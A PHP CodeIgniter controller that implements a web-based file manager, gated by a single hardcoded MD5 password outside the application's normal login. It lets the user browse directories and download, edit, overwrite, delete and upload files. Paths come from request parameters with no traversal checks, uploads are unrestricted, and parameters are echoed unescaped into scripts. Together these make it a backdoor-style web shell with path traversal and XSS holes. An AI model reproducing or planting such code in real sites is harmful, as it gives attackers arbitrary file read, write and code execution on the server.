<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Webfile extends CI_Controller
{
	public function __construct()
	{
		parent::__construct();
	}
	public function index()
	{
		$web_file_user = $this->session->userdata('web_file_user');
		$dopost = $this->input->post('dopost');
		if($web_file_user == ''){
			//登陆
			if($dopost=='login') {
				if(md5($_POST['password'])=='87c5cf68b47a03483c443cfb7654c318'){
					$web_file_user = $this->session->set_userdata('web_file_user','admin');
					header('location:'.site_url('manager/webfile'));
				}
			}else{
				echo <<<end
          <form id="form1" name="form1" method="post" action="">
            <input type="text" name="password" />
            <input type="submit" value="登陆" />
            <input type="hidden" name="dopost" value="login" />
          </form>
end;
			}
		}elseif($web_file_user == 'admin'){
			$action = $this->input->get('action');
			$file_name = $this->input->get('file_name');
			$file   = $this->input->get('file');
			$dir = dirname(__FILE__);
			//下载文件
			if($action=='down'){
				$files=fopen($dir.$file,"r");
				header("Content-Type: application/octet-stream");
				header("Accept-Ranges: bytes");
				header("Accept-Length: ".filesize($dir.$file));
				header("Content-Disposition: attachment; filename=$file_name");
				echo fread($files,filesize($dir.$file));
				fclose($files);
			}elseif($action=='edit'){
				//编辑文件
				$file_name = $_GET['file_name'];
				$file      = $_GET['file'];
				if($dopost=='save'){
					$content = $_POST['content'];
					$content = stripslashes($content);
					$content = preg_replace("/##textarea/i", "<textarea", $content);
					$content = preg_replace("/##\/textarea/i", "</textarea", $content);
					$content = preg_replace("/##form/i", "<form", $content);
					$content = preg_replace("/##\/form/i", "</form", $content);
					$fp = fopen($dir.$file, 'w');
					fwrite($fp, $content);
					fclose($fp);
					$get_now_url = $_GET['get_now_url'];
					echo "<script language='javascript'>alert('文件保存成功');window.location.href='$get_now_url';</script>";
				}else{
					$fp = fopen($dir.$file, 'r');
					$content = fread($fp, filesize($dir.$file));
					fclose($fp);
					$content = preg_replace("#<textarea#i", "##textarea", $content);
					$content = preg_replace("#</textarea#i", "##/textarea", $content);
					$content = preg_replace("#<form#i", "##form", $content);
					$content = preg_replace("#</form#i", "##/form", $content);
					echo <<<end
					  <form id="form1" name="form1" method="post" action="">
						<textarea style="width:800px; height:500px;" name="content">$content</textarea><br>
						<input type="submit" value="保存" />
						<input type="hidden" name="dopost" value="save" />
					  </form>
end;
				}
			}elseif($action=='delete'){
				//删除文件
				$file      = $_GET['file'];
				unlink($dir.$file);
				$get_now_url = $_GET['get_now_url'];
				echo "<script language='javascript'>alert('文件已经删除');window.location.href='$get_now_url';</script>";
			}else{
				//上传文件
				if($dopost=='upload') {
					$up_file = $_POST['up_file'];
					$filename =$_FILES['up_file_name'];
					$new_file = $dir.$up_file.'/'.$filename['name'];
					if(!move_uploaded_file($filename['tmp_name'],$new_file)){
						echo "<script language='javascript'>alert('上传失败');window.location.href='".get_now_url()."';</script>";
					}else{
						echo "<script language='javascript'>window.location.href='".get_now_url()."';</script>";
					}
				}else{
					//目录列表
					$files = array();
					if(is_dir($dir.'/'.$file)) {
						if($files = scandir($dir.'/'.$file)) {
							$dir_list = $files;
						}
					}
					echo <<<end
                当前目录$file
                <table width="400" border="0" cellspacing="1" cellpadding="1" bgcolor="#CCCCCC">
end;
					$get_now_url = get_now_url();
					foreach($dir_list as $key){
						if(is_dir($dir.$file.'/'.$key)){
							$link = '?file='.$file.'/'.$key;
						}else{
							$link = '#';
						}
						echo <<<end
                    <tr>
                        <td bgcolor="#FFFFFF"><a href="$link">$key</a></td>
                        <td width="130" bgcolor="#FFFFFF">
end;
						if(!is_dir($dir.$file.'/'.$key)){
							echo <<<end
                        <a target="_blank" href="?action=down&file_name=$key&file=$file/$key">下载</a>
                        <a href="?action=edit&file_name=$key&file=$file/$key&get_now_url=$get_now_url">编辑</a>
                        <a href="?action=delete&file=$file/$key&get_now_url=$get_now_url">删除</a>
end;
						}
						echo <<<end
                    </td>
                </tr>
end;
					}
					echo <<<end
						</table>
						<form id="form1" name="form1" method="post" action="" enctype="multipart/form-data">
							<input type="text" name="up_file" value="$file"/><br>
							<input type="file" name="up_file_name"/><br>
							<input type="submit" value="保存" />
							<input type="hidden" name="dopost" value="upload" />
						</form>
end;
				}
			}
		}
	}
}